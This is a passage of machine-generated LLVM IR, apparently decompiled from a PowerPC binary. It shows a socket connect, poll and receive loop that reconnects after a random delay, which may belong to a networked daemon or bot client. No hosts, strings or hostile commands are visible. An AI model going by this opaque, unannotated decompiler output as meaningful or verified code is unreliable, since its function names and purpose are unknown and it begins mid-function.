  store i8 %v1_10005cdc, i8* %v4_10005cdc, align 1
  %v2_10005ce4 = inttoptr i32 %v2_10005cd8 to i8*
  %v3_10005ce4 = call i32 @function_10007504(i8* %v2_10005ce4, i32 %v2_10005cb8)
  %v0_10005ce8 = call i32 @function_10006318()
  %v1_10005ce8 = sext i32 %v0_10005ce8 to i64
  %v5_10005cf8 = mul nuw nsw i64 %v1_10005ce8, 2863311531
  %v1_10005d004 = udiv i64 %v5_10005cf8, 17179869184
  %v1_10005d00 = trunc i64 %v1_10005d004 to i32
  %v1_10005d04 = mul i32 %v1_10005d00, 6
  store i32 %v1_10005d04, i32* %r0.global-to-local, align 4
  %v2_10005d08 = sub i32 %v0_10005ce8, %v1_10005d04
  %v1_10005d0c = mul i32 %v2_10005d08, 4
  %v1_10005d10 = add i32 %v1_10005d0c, 12
  %v0_10005d18 = load i32, i32* @r25, align 4
  %v2_10005d18 = add i32 %v1_10005d10, %v0_10005d18
  store i32 %v2_10005d18, i32* @r29, align 4
  store i32 268459296, i32* @lr, align 4
  %v3_10005d1c = call i32 @function_100063d8(i8* %v2_10005cd4, i32 %v1_10005d10)
  %v0_10005d20 = load i32, i32* @r27, align 4
  %v1_10005d20 = trunc i32 %v0_10005d20 to i8
  %v2_10005d20 = load i32, i32* @r29, align 4
  %v3_10005d20 = add i32 %v2_10005d20, 102
  %v4_10005d20 = inttoptr i32 %v3_10005d20 to i8*
  store i8 %v1_10005d20, i8* %v4_10005d20, align 1
  store i32 ptrtoint ([3 x i8]* @global_var_10005d34.130 to i32), i32* @lr, align 4
  %v2_10005d30 = call i32 @function_10007f58(i32 15, i32 %v2_10005cb8)
  store i32 268459324, i32* @lr, align 4
  %v1_10005d38 = call i32 @function_10006c64(i32 2)
  %v3_10005d44 = call i32 @function_10006bb0(i32 2, i32* nonnull %stack_var_-1652)
  %v3_10005d48 = load i32, i32* %stack_var_-1652, align 4
  store i32 %v3_10005d48, i32* %r5.global-to-local, align 4
  store i32 268459352, i32* @lr, align 4
  %v3_10005d54 = call i32 @function_100081c8(i32 1, i32 %v3_10005d44, i32 %v3_10005d48)
  store i32 1, i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005d6c.132 to i32), i32* @lr, align 4
  %v3_10005d68 = call i32 @function_100081c8(i32 1, i32 ptrtoint (i32* @global_var_1000a848.131 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_10005d74.133 to i32), i32* @lr, align 4
  %v1_10005d70 = call i32 @function_10006bd8(i32 2)
  store i32 268459384, i32* @lr, align 4
  %v0_10005d74 = call i32 @function_10007db0()
  %tmp66 = icmp slt i32 %v0_10005d74, 1
  br i1 %tmp66, label %dec_label_pc_10005e00, label %dec_label_pc_10005d80

dec_label_pc_10005d80:                            ; preds = %dec_label_pc_10005cb4
  store i32 %v0_10005a2c, i32* %r0.global-to-local, align 4
  store i32 %v0_10005a30, i32* %r29.global-to-local, align 4
  ret i32 0

dec_label_pc_10005ddc:                            ; preds = %dec_label_pc_10005a28
  store i32 268459504, i32* @lr, align 4
  %v3_10005dec = call i32 @function_10007ed0(i32 ptrtoint ([19 x i8]* @global_var_1000a834.134 to i32), i32 2)
  %v3_10005df0 = icmp eq i32 %v3_10005dec, -1
  store i32 %v3_10005dec, i32* @r29, align 4
  br i1 %v3_10005df0, label %dec_label_pc_10005b10, label %dec_label_pc_10005ae8

dec_label_pc_10005e00:                            ; preds = %dec_label_pc_10005cb4
  store i32 ptrtoint ([3 x i8]* @global_var_10005e04.135 to i32), i32* @lr, align 4
  %v1_10005e00 = call i32 @function_10008078(i32 %v0_10005d74)
  store i32 ptrtoint ([3 x i8]* @global_var_10005e0c.136 to i32), i32* @lr, align 4
  %v0_10005e08 = call i32 @function_10007d68()
  store i32 ptrtoint ([3 x i8]* @global_var_10005e14.137 to i32), i32* @lr, align 4
  %v0_10005e10 = call i32 @function_10007d68()
  store i32 268459548, i32* @lr, align 4
  %v0_10005e18 = call i32 @function_10007d68()
  store i32 0, i32* @r23, align 4
  store i32 268459556, i32* @lr, align 4
  %v1_10005e20 = call i32 @function_10002244(i32 %v0_10005e18)
  %v2_10005e24 = ptrtoint i32* %stack_var_-1648 to i32
  store i32 268459564, i32* @lr, align 4
  %v1_10005e28 = call i32 @function_10005028(i32 %v1_10005e20)
  %v2_10005e2c = ptrtoint i32* %stack_var_-1228 to i32
  store i32 %v2_10005e2c, i32* @r27, align 4
  %v2_10005e30 = ptrtoint i32* %stack_var_-1484 to i32
  store i32 %v2_10005e30, i32* @r28, align 4
  store i32 268566528, i32* @r24, align 4
  store i32 268566528, i32* @r26, align 4
  %v2_10005e40 = ptrtoint i32* %stack_var_-1640 to i32
  %v2_10005e44 = ptrtoint i32* %stack_var_-1620 to i32
  %v2_10005e48 = ptrtoint i32* %stack_var_-1644 to i32
  %v2_10006094 = ptrtoint i32* %stack_var_-1100 to i32
  %v1_100061f4 = bitcast i32* %stack_var_-1586 to i8*
  br label %dec_label_pc_10005e50

dec_label_pc_10005e50:                            ; preds = %dec_label_pc_10005e50.backedge, %dec_label_pc_10005e00
  %v2_10005e6067 = phi i32 [ %v2_10005e6067.pre, %dec_label_pc_10005e50.backedge ], [ %v2_10005e2c, %dec_label_pc_10005e00 ]
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v4_10005e6069 = inttoptr i32 %v2_10005e6067 to i32*
  store i32 0, i32* %v4_10005e6069, align 4
  %v0_10005e6470 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005e6471 = add i32 %v0_10005e6470, 4
  store i32 %v1_10005e6471, i32* %r9.global-to-local, align 4
  %v0_10005e6872 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10005e6873 = add i32 %v0_10005e6872, -1
  store i32 %v1_10005e6873, i32* %ctr.global-to-local, align 4
  %v2_10005e6874 = icmp eq i32 %v1_10005e6873, 0
  br i1 %v2_10005e6874, label %dec_label_pc_10005e6c, label %dec_label_pc_10005e60.dec_label_pc_10005e60_crit_edge

dec_label_pc_10005e60.dec_label_pc_10005e60_crit_edge: ; preds = %dec_label_pc_10005e50, %dec_label_pc_10005e60.dec_label_pc_10005e60_crit_edge
  %v1_10005e6475 = phi i32 [ %v1_10005e64, %dec_label_pc_10005e60.dec_label_pc_10005e60_crit_edge ], [ %v1_10005e6471, %dec_label_pc_10005e50 ]
  %v0_10005e60.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_10005e60 = load i32, i32* @r27, align 4
  %v3_10005e60 = add i32 %v2_10005e60, %v1_10005e6475
  %v4_10005e60 = inttoptr i32 %v3_10005e60 to i32*
  store i32 %v0_10005e60.pre, i32* %v4_10005e60, align 4
  %v0_10005e64 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005e64 = add i32 %v0_10005e64, 4
  store i32 %v1_10005e64, i32* %r9.global-to-local, align 4
  %v0_10005e68 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10005e68 = add i32 %v0_10005e68, -1
  store i32 %v1_10005e68, i32* %ctr.global-to-local, align 4
  %v2_10005e68 = icmp eq i32 %v1_10005e68, 0
  br i1 %v2_10005e68, label %dec_label_pc_10005e6c, label %dec_label_pc_10005e60.dec_label_pc_10005e60_crit_edge

dec_label_pc_10005e6c:                            ; preds = %dec_label_pc_10005e60.dec_label_pc_10005e60_crit_edge, %dec_label_pc_10005e50
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10005e7c76 = load i32, i32* @r28, align 4
  %v4_10005e7c78 = inttoptr i32 %v2_10005e7c76 to i32*
  store i32 0, i32* %v4_10005e7c78, align 4
  %v0_10005e8079 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005e8080 = add i32 %v0_10005e8079, 4
  store i32 %v1_10005e8080, i32* %r9.global-to-local, align 4
  %v0_10005e8481 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10005e8482 = add i32 %v0_10005e8481, -1
  store i32 %v1_10005e8482, i32* %ctr.global-to-local, align 4
  %v2_10005e8483 = icmp eq i32 %v1_10005e8482, 0
  br i1 %v2_10005e8483, label %dec_label_pc_10005e88, label %dec_label_pc_10005e7c.dec_label_pc_10005e7c_crit_edge

dec_label_pc_10005e7c.dec_label_pc_10005e7c_crit_edge: ; preds = %dec_label_pc_10005e6c, %dec_label_pc_10005e7c.dec_label_pc_10005e7c_crit_edge
  %v1_10005e8084 = phi i32 [ %v1_10005e80, %dec_label_pc_10005e7c.dec_label_pc_10005e7c_crit_edge ], [ %v1_10005e8080, %dec_label_pc_10005e6c ]
  %v0_10005e7c.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_10005e7c = load i32, i32* @r28, align 4
  %v3_10005e7c = add i32 %v2_10005e7c, %v1_10005e8084
  %v4_10005e7c = inttoptr i32 %v3_10005e7c to i32*
  store i32 %v0_10005e7c.pre, i32* %v4_10005e7c, align 4
  %v0_10005e80 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005e80 = add i32 %v0_10005e80, 4
  store i32 %v1_10005e80, i32* %r9.global-to-local, align 4
  %v0_10005e84 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10005e84 = add i32 %v0_10005e84, -1
  store i32 %v1_10005e84, i32* %ctr.global-to-local, align 4
  %v2_10005e84 = icmp eq i32 %v1_10005e84, 0
  br i1 %v2_10005e84, label %dec_label_pc_10005e88, label %dec_label_pc_10005e7c.dec_label_pc_10005e7c_crit_edge

dec_label_pc_10005e88:                            ; preds = %dec_label_pc_10005e7c.dec_label_pc_10005e7c_crit_edge, %dec_label_pc_10005e6c
  %v3_10005e88 = load i32, i32* @global_var_1001b268.109, align 4
  store i32 %v3_10005e88, i32* %r10.global-to-local, align 4
  %v3_10005e8c = icmp eq i32 %v3_10005e88, -1
  br i1 %v3_10005e8c, label %dec_label_pc_10005eb4, label %dec_label_pc_10005e94

dec_label_pc_10005e94:                            ; preds = %dec_label_pc_10005e88
  %v1_10005e94 = call i32 @__asm_rlwinm(i32 %v3_10005e88, i32 29, i32 3, i32 29)
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10005e9c = load i32, i32* @r25, align 4
  %v2_10005e9c = add i32 %v1_10005e9c, %v1_10005e94
  %v1_10005ea0 = urem i32 %v3_10005e88, 32
  store i32 %v1_10005ea0, i32* %r10.global-to-local, align 4
  %v1_10005ea4 = add i32 %v2_10005e9c, 428
  %v2_10005ea4 = inttoptr i32 %v1_10005ea4 to i32*
  %v3_10005ea4 = load i32, i32* %v2_10005ea4, align 4
  %v3_10005ea8 = shl i32 1, %v1_10005ea0
  store i32 %v3_10005ea8, i32* %r0.global-to-local, align 4
  %v2_10005eac = or i32 %v3_10005ea4, %v3_10005ea8
  store i32 %v2_10005eac, i32* %r9.global-to-local, align 4
  store i32 %v2_10005eac, i32* %v2_10005ea4, align 4
  br label %dec_label_pc_10005eb4

dec_label_pc_10005eb4:                            ; preds = %dec_label_pc_10005e88, %dec_label_pc_10005e94
  %v3_10005eb4 = load i32, i32* @global_var_1001b26c.138, align 4
  store i32 %v3_10005eb4, i32* %r0.global-to-local, align 4
  store i32 268566528, i32* @r31, align 4
  %v3_10005ebc = icmp eq i32 %v3_10005eb4, -1
  br i1 %v3_10005ebc, label %dec_label_pc_100060dc, label %dec_label_pc_10005ec4

dec_label_pc_10005ec4:                            ; preds = %dec_label_pc_100060dc, %dec_label_pc_10005eb4, %dec_label_pc_10006138
  %v3_10005ff0 = phi i32 [ -1, %dec_label_pc_100060dc ], [ %v3_10005eb4, %dec_label_pc_10005eb4 ], [ %v3_10005ff0.pre, %dec_label_pc_10006138 ]
  %v3_10005ec4 = load i8, i8* @global_var_1001b2a0.139, align 1
  %v3_10005ec8 = icmp eq i8 %v3_10005ec4, 0
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10005ff8 = call i32 @__asm_rlwinm(i32 %v3_10005ff0, i32 29, i32 3, i32 29)
  %v1_10005ffc = urem i32 %v3_10005ff0, 32
  %v1_10006000 = load i32, i32* @r25, align 4
  %v2_10006000 = add i32 %v1_10006000, %v1_10005ff8
  store i32 %v2_10006000, i32* %r10.global-to-local, align 4
  %v0_10006004 = load i32, i32* %r0.global-to-local, align 4
  %v3_10006004 = shl i32 %v0_10006004, %v1_10005ffc
  store i32 %v3_10006004, i32* %r0.global-to-local, align 4
  br i1 %v3_10005ec8, label %dec_label_pc_10005ff0, label %dec_label_pc_10005ed0

dec_label_pc_10005ed0:                            ; preds = %dec_label_pc_10005ec4
  %v1_10005ee8 = add i32 %v2_10006000, 172
  %v2_10005ee8 = inttoptr i32 %v1_10005ee8 to i32*
  %v3_10005ee8 = load i32, i32* %v2_10005ee8, align 4
  %v2_10005eec = or i32 %v3_10005ee8, %v3_10006004
  store i32 %v2_10005eec, i32* %r9.global-to-local, align 4
  store i32 %v2_10005eec, i32* %v2_10005ee8, align 4
  br label %dec_label_pc_10005ef4

dec_label_pc_10005ef4:                            ; preds = %dec_label_pc_10005ff0, %dec_label_pc_10005ed0
  %v3_10005ef4 = load i32, i32* @global_var_1001b26c.138, align 4
  store i32 %v3_10005ef4, i32* %r0.global-to-local, align 4
  %v3_10005ef8 = load i32, i32* @global_var_1001b268.109, align 4
  %v2_10005efc = icmp slt i32 %v3_10005ef8, %v3_10005ef4
  br i1 %v2_10005efc, label %dec_label_pc_10005f04, label %dec_label_pc_10005f08

dec_label_pc_10005f04:                            ; preds = %dec_label_pc_10005ef4
  br label %dec_label_pc_10005f08

dec_label_pc_10005f08:                            ; preds = %dec_label_pc_10005ef4, %dec_label_pc_10005f04
  %v0_10005f10 = phi i32 [ %v3_10005ef8, %dec_label_pc_10005ef4 ], [ %v3_10005ef4, %dec_label_pc_10005f04 ]
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r9.global-to-local, align 4
  %v1_10005f10 = add i32 %v0_10005f10, 1
  store i32 %v2_10005e30, i32* %r5.global-to-local, align 4
  store i32 10, i32* %stack_var_-1640, align 4
  store i32 268459824, i32* @lr, align 4
  %v6_10005f2c = call i32 @function_10008030(i32 %v1_10005f10, i32 %v2_10005e2c, i32 %v2_10005e30, i32 0, i32 %v2_10005e40, i32 10)
  %v7_10005f2c = trunc i32 %v6_10005f2c to i16
  %v4_10005f30 = icmp eq i16 %v7_10005f2c, -1
  br i1 %v4_10005f30, label %dec_label_pc_10005e50.backedge, label %dec_label_pc_10005f38

dec_label_pc_10005f38:                            ; preds = %dec_label_pc_10005f08
  %v4_10005f38 = icmp eq i16 %v7_10005f2c, 0
  br i1 %v4_10005f38, label %dec_label_pc_10005f40, label %dec_label_pc_10005f6c

dec_label_pc_10005f40:                            ; preds = %dec_label_pc_10005f38
  %v0_10005f44 = load i32, i32* @r23, align 4
  store i16 0, i16* %stack_var_-1656, align 2
  %v2_10005f54 = srem i32 %v0_10005f44, 6
  %v1_10005f58 = sub i32 %v0_10005f44, %v2_10005f54
  store i32 %v1_10005f58, i32* %r9.global-to-local, align 4
  store i32 %v2_10005f54, i32* %r0.global-to-local, align 4
  %v1_10005f60 = add i32 %v0_10005f44, 1
  store i32 %v1_10005f60, i32* @r23, align 4
  %v3_10005f64 = icmp eq i32 %v2_10005f54, 0
  br i1 %v3_10005f64, label %dec_label_pc_100061d4, label %dec_label_pc_10005f6c

dec_label_pc_10005f6c:                            ; preds = %dec_label_pc_10005f38, %dec_label_pc_10005f40, %dec_label_pc_100061d4
  %v3_10005f6c = load i32, i32* @global_var_1001b268.109, align 4
  %v3_10005f70 = icmp eq i32 %v3_10005f6c, -1
  br i1 %v3_10005f70, label %dec_label_pc_10005f94, label %dec_label_pc_10005f78

dec_label_pc_10005f78:                            ; preds = %dec_label_pc_10005f6c
  %v1_10005f78 = call i32 @__asm_rlwinm(i32 %v3_10005f6c, i32 29, i32 3, i32 29)
  %v1_10005f7c = urem i32 %v3_10005f6c, 32
  %v1_10005f80 = load i32, i32* @r25, align 4
  %v2_10005f80 = add i32 %v1_10005f80, %v1_10005f78
  store i32 %v2_10005f80, i32* %r9.global-to-local, align 4
  %v1_10005f84 = add i32 %v2_10005f80, 428
  %v2_10005f84 = inttoptr i32 %v1_10005f84 to i32*
  %v3_10005f84 = load i32, i32* %v2_10005f84, align 4
  %v3_10005f88 = lshr i32 %v3_10005f84, %v1_10005f7c
  store i32 %v3_10005f88, i32* %r0.global-to-local, align 4
  %v1_10005f8c = urem i32 %v3_10005f88, 2
  store i32 %v1_10005f8c, i32* %r9.global-to-local, align 4
  %v3_10005f8c = icmp eq i32 %v1_10005f8c, 0
  br i1 %v3_10005f8c, label %dec_label_pc_10005f94, label %dec_label_pc_10006154

dec_label_pc_10005f94:                            ; preds = %dec_label_pc_10005f78, %dec_label_pc_10005f6c, %dec_label_pc_10006154
  %v3_10005f94 = load i8, i8* @global_var_1001b2a0.139, align 1
  %v4_10005f94 = zext i8 %v3_10005f94 to i32
  store i32 %v4_10005f94, i32* @r29, align 4
  %v3_10005f98 = icmp eq i8 %v3_10005f94, 0
  %v3_10006018 = load i32, i32* @global_var_1001b26c.138, align 4
  br i1 %v3_10005f98, label %dec_label_pc_10006018, label %dec_label_pc_10005fa0

dec_label_pc_10005fa0:                            ; preds = %dec_label_pc_10005f94
  store i32 268566528, i32* @r31, align 4
  %v1_10005fa8 = call i32 @__asm_rlwinm(i32 %v3_10006018, i32 29, i32 3, i32 29)
  %v1_10005fac = urem i32 %v3_10006018, 32
  %v1_10005fb0 = load i32, i32* @r25, align 4
  %v2_10005fb0 = add i32 %v1_10005fb0, %v1_10005fa8
  store i32 %v2_10005fb0, i32* %r9.global-to-local, align 4
  %v1_10005fb4 = add i32 %v2_10005fb0, 172
  %v2_10005fb4 = inttoptr i32 %v1_10005fb4 to i32*
  %v3_10005fb4 = load i32, i32* %v2_10005fb4, align 4
  %v3_10005fb8 = lshr i32 %v3_10005fb4, %v1_10005fac
  store i32 %v3_10005fb8, i32* %r0.global-to-local, align 4
  %v1_10005fc0 = urem i32 %v3_10005fb8, 2
  %v3_10005fc0 = icmp eq i32 %v1_10005fc0, 0
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i8 0, i8* @global_var_1001b2a0.139, align 1
  br i1 %v3_10005fc0, label %dec_label_pc_10005fd0, label %dec_label_pc_1000616c

dec_label_pc_10005fd0:                            ; preds = %dec_label_pc_10005fa0
  %v3_10005fd0 = icmp eq i32 %v3_10006018, -1
  br i1 %v3_10005fd0, label %dec_label_pc_10005fdc, label %dec_label_pc_10005fd8

dec_label_pc_10005fd8:                            ; preds = %dec_label_pc_10005fd0
  store i32 ptrtoint (i32* @global_var_10005fdc.140 to i32), i32* @lr, align 4
  %v0_10005fd8 = call i32 @function_10007d68()
  br label %dec_label_pc_10005fdc

dec_label_pc_10005fdc:                            ; preds = %dec_label_pc_10005fd0, %dec_label_pc_10005fd8
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @global_var_1001b26c.138, align 4
  store i32 268460012, i32* @lr, align 4
  %v1_10005fe8 = call i32 @function_1000965c(i32 1)
  br label %dec_label_pc_10005e50.backedge

dec_label_pc_10005e50.backedge:                   ; preds = %dec_label_pc_10005fdc, %dec_label_pc_100060c4, %dec_label_pc_1000619c, %dec_label_pc_10006238, %dec_label_pc_10006264, %dec_label_pc_100062c8, %dec_label_pc_10005f08, %dec_label_pc_10006018, %dec_label_pc_10006028, %dec_label_pc_100061f0, %dec_label_pc_1000624c, %dec_label_pc_10006294, %dec_label_pc_10006258
  %v2_10005e6067.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10005e50

dec_label_pc_10005ff0:                            ; preds = %dec_label_pc_10005ec4
  %v1_10006008 = add i32 %v2_10006000, 428
  %v2_10006008 = inttoptr i32 %v1_10006008 to i32*
  %v3_10006008 = load i32, i32* %v2_10006008, align 4
  %v2_1000600c = or i32 %v3_10006008, %v3_10006004
  store i32 %v2_1000600c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000600c, i32* %v2_10006008, align 4
  br label %dec_label_pc_10005ef4

dec_label_pc_10006018:                            ; preds = %dec_label_pc_10005f94
  store i32 268566528, i32* @r30, align 4
  %v3_10006020 = icmp eq i32 %v3_10006018, -1
  br i1 %v3_10006020, label %dec_label_pc_10005e50.backedge, label %dec_label_pc_10006028

dec_label_pc_10006028:                            ; preds = %dec_label_pc_10006018
  %v1_10006028 = call i32 @__asm_rlwinm(i32 %v3_10006018, i32 29, i32 3, i32 29)
  %v1_1000602c = urem i32 %v3_10006018, 32
  %v1_10006030 = load i32, i32* @r25, align 4
  %v2_10006030 = add i32 %v1_10006030, %v1_10006028
  store i32 %v2_10006030, i32* %r9.global-to-local, align 4
  %v1_10006034 = add i32 %v2_10006030, 428
  %v2_10006034 = inttoptr i32 %v1_10006034 to i32*
  %v3_10006034 = load i32, i32* %v2_10006034, align 4
  %v3_10006038 = lshr i32 %v3_10006034, %v1_1000602c
  store i32 %v3_10006038, i32* %r0.global-to-local, align 4
  %v1_1000603c = urem i32 %v3_10006038, 2
  store i32 %v1_1000603c, i32* %r9.global-to-local, align 4
  %v3_1000603c = icmp eq i32 %v1_1000603c, 0
  br i1 %v3_1000603c, label %dec_label_pc_10005e50.backedge, label %dec_label_pc_10006044

dec_label_pc_10006044:                            ; preds = %dec_label_pc_10006028
  %v0_10006044 = call i32 @function_10008484()
  %v0_1000604c = load i32, i32* @r29, align 4
  %v2_1000604c = inttoptr i32 %v0_10006044 to i32*
  store i32 %v0_1000604c, i32* %v2_1000604c, align 4
  store i32 %v0_10006044, i32* @r31, align 4
  store i32 2, i32* %r5.global-to-local, align 4
  %v3_1000605c = load i32, i32* @global_var_1001b26c.138, align 4
  store i32 268460132, i32* @lr, align 4
  %v4_10006060 = call i32 @function_10008a08(i32 %v3_1000605c, i32 %v2_10005bbc, i32 2, i32 16386)
  %v3_10006064 = icmp eq i32 %v4_10006060, -1
  br i1 %v3_10006064, label %dec_label_pc_1000624c, label %dec_label_pc_1000606c

dec_label_pc_1000606c:                            ; preds = %dec_label_pc_10006044
  %v3_1000606c = icmp eq i32 %v4_10006060, 0
  br i1 %v3_1000606c, label %dec_label_pc_100060b4, label %dec_label_pc_10006074

dec_label_pc_10006074:                            ; preds = %dec_label_pc_1000606c
  %v3_10006074 = load i16, i16* %stack_var_-1656, align 2
  %v4_10006074 = sext i16 %v3_10006074 to i32
  store i32 %v4_10006074, i32* %r5.global-to-local, align 4
  %v1_10006078 = urem i32 %v4_10006074, 65536
  store i32 %v1_10006078, i32* %r0.global-to-local, align 4
  %v3_1000607c = icmp eq i32 %v1_10006078, 0
  br i1 %v3_1000607c, label %dec_label_pc_10006264, label %dec_label_pc_10006084

dec_label_pc_10006084:                            ; preds = %dec_label_pc_10006074
  %v2_10006084 = icmp ugt i32 %v1_10006078, 1024
  br i1 %v2_10006084, label %dec_label_pc_1000627c, label %dec_label_pc_1000608c

dec_label_pc_1000608c:                            ; preds = %dec_label_pc_10006084, %dec_label_pc_1000627c
  %v0_1000608c = load i32, i32* @r29, align 4
  %v1_1000608c = load i32, i32* @r31, align 4
  %v2_1000608c = inttoptr i32 %v1_1000608c to i32*
  store i32 %v0_1000608c, i32* %v2_1000608c, align 4
  %v0_10006090 = load i32, i32* %r5.global-to-local, align 4
  %v1_10006090 = urem i32 %v0_10006090, 65536
  store i32 %v1_10006090, i32* %r5.global-to-local, align 4
  %v3_1000609c = load i32, i32* @global_var_1001b26c.138, align 4
  store i32 268460196, i32* @lr, align 4
  %v4_100060a0 = call i32 @function_10008a08(i32 %v3_1000609c, i32 %v2_10006094, i32 %v1_10006090, i32 16386)
  %v3_100060a4 = icmp eq i32 %v4_100060a0, -1
  br i1 %v3_100060a4, label %dec_label_pc_1000624c, label %dec_label_pc_100060ac

dec_label_pc_100060ac:                            ; preds = %dec_label_pc_1000608c
  %v3_100060ac = icmp eq i32 %v4_100060a0, 0
  br i1 %v3_100060ac, label %dec_label_pc_100060b4, label %dec_label_pc_10006294

dec_label_pc_100060b4:                            ; preds = %dec_label_pc_10006258, %dec_label_pc_100060ac, %dec_label_pc_1000606c
  %v3_100060b4 = load i32, i32* @global_var_1001b26c.138, align 4
  %v3_100060b8 = icmp eq i32 %v3_100060b4, -1
  br i1 %v3_100060b8, label %dec_label_pc_100060c4, label %dec_label_pc_100060c0

dec_label_pc_100060c0:                            ; preds = %dec_label_pc_100060b4
  store i32 ptrtoint (i32* @global_var_100060c4.141 to i32), i32* @lr, align 4
  %v0_100060c0 = call i32 @function_10007d68()
  br label %dec_label_pc_100060c4

dec_label_pc_100060c4:                            ; preds = %dec_label_pc_100060b4, %dec_label_pc_100060c0
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 -1, i32* @global_var_1001b26c.138, align 4
  store i32 268460248, i32* @lr, align 4
  %v1_100060d4 = call i32 @function_1000965c(i32 1)
  br label %dec_label_pc_10005e50.backedge

dec_label_pc_100060dc:                            ; preds = %dec_label_pc_10005eb4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 268460268, i32* @lr, align 4
  %v3_100060e8 = call i32 @function_10008b34(i32 2, i32 1, i32 0)
  %v3_100060ec = icmp eq i32 %v3_100060e8, -1
  store i32 %v3_100060e8, i32* %r29.global-to-local, align 4
  store i32 %v3_100060e8, i32* @global_var_1001b26c.138, align 4
  br i1 %v3_100060ec, label %dec_label_pc_10005ec4, label %dec_label_pc_100060fc

dec_label_pc_100060fc:                            ; preds = %dec_label_pc_100060dc
  store i32 3, i32* @r4, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 268460300, i32* @lr, align 4
  %v1_10006108 = call i32 @function_10007c38(i32 3)
  store i32 4, i32* @r4, align 4
  %v1_10006110 = or i32 %v1_10006108, 2048
  store i32 %v1_10006110, i32* %r5.global-to-local, align 4
  %v0_10006114 = load i32, i32* %r29.global-to-local, align 4
  store i32 268460320, i32* @lr, align 4
  %v2_1000611c = call i32 @function_10007c38(i32 %v0_10006114)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10006124 = load i32, i32* @global_var_1001b270.108, align 4
  store i32 %v3_10006124, i32* %r0.global-to-local, align 4
  %v3_10006128 = icmp eq i32 %v3_10006124, 0
  br i1 %v3_10006128, label %dec_label_pc_10006138, label %dec_label_pc_10006130

dec_label_pc_10006130:                            ; preds = %dec_label_pc_100060fc
  store i32 %v3_10006124, i32* %ctr.global-to-local, align 4
  store i32 268460344, i32* @lr, align 4
  %v2_10006134 = call i32 @function_100077e0(i32 %v2_1000611c)
  br label %dec_label_pc_10006138

dec_label_pc_10006138:                            ; preds = %dec_label_pc_100060fc, %dec_label_pc_10006130
  %v3_10006138 = load i32, i32* @global_var_1001b26c.138, align 4
  store i32 %v3_10006138, i32* @r3, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r5.global-to-local, align 4
  store i8 1, i8* @global_var_1001b2a0.139, align 1
  store i32 268460368, i32* @lr, align 4
  %v0_1000614c = call i32 @function_10008934()
  %v3_10005ff0.pre = load i32, i32* @global_var_1001b26c.138, align 4
  br label %dec_label_pc_10005ec4

dec_label_pc_10006154:                            ; preds = %dec_label_pc_10005f78
  store i32 16, i32* %r0.global-to-local, align 4
  store i32 %v2_10005e24, i32* %r5.global-to-local, align 4
  store i32 16, i32* %stack_var_-1648, align 4
  store i32 268460392, i32* @lr, align 4
  %v3_10006164 = call i32 @function_100088cc(i32 %v2_10005e44, i32 %v2_10005e24, i32 %v1_10005f8c)
  br label %dec_label_pc_10005f94

dec_label_pc_1000616c:                            ; preds = %dec_label_pc_10005fa0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  store i32 4, i32* %r5.global-to-local, align 4
  store i32 0, i32* %stack_var_-1648, align 4
  store i32 4, i32* %stack_var_-1644, align 4
  store i32 268460432, i32* @lr, align 4
  %v5_1000618c = call i32 @function_1000899c(i32 1, i32 4, i32 %v2_10005e24, i32 %v2_10005e48, i32 4)
  %v3_10006190 = load i32, i32* %stack_var_-1648, align 4
  store i32 %v3_10006190, i32* %r0.global-to-local, align 4
  %v3_10006194 = icmp eq i32 %v3_10006190, 0
  br i1 %v3_10006194, label %dec_label_pc_100061f0, label %dec_label_pc_1000619c

dec_label_pc_1000619c:                            ; preds = %dec_label_pc_1000616c
  store i32 ptrtoint (i32* @global_var_100061a4.142 to i32), i32* @lr, align 4
  %v0_100061a0 = call i32 @function_10007d68()
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @global_var_1001b26c.138, align 4
  %v0_100061ac = call i32 @function_10006318()
  %v1_100061ac = sext i32 %v0_100061ac to i64
  %v5_100061b8 = mul nuw nsw i64 %v1_100061ac, 3435973837
  %v1_100061bc6 = udiv i64 %v5_100061b8, 34359738368
  %v1_100061bc = trunc i64 %v1_100061bc6 to i32
  %v1_100061c0 = mul i32 %v1_100061bc, 10
  store i32 %v1_100061c0, i32* %r0.global-to-local, align 4
  %v3_100061c4 = sub i32 %v0_100061ac, %v1_100061c0
  %v1_100061c8 = add i32 %v3_100061c4, 1
  store i32 268460496, i32* @lr, align 4
  %v1_100061cc = call i32 @function_1000965c(i32 %v1_100061c8)
  br label %dec_label_pc_10005e50.backedge

dec_label_pc_100061d4:                            ; preds = %dec_label_pc_10005f40
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_100061dc = load i32, i32* @global_var_1001b26c.138, align 4
  store i32 2, i32* %r5.global-to-local, align 4
  store i32 268460524, i32* @lr, align 4
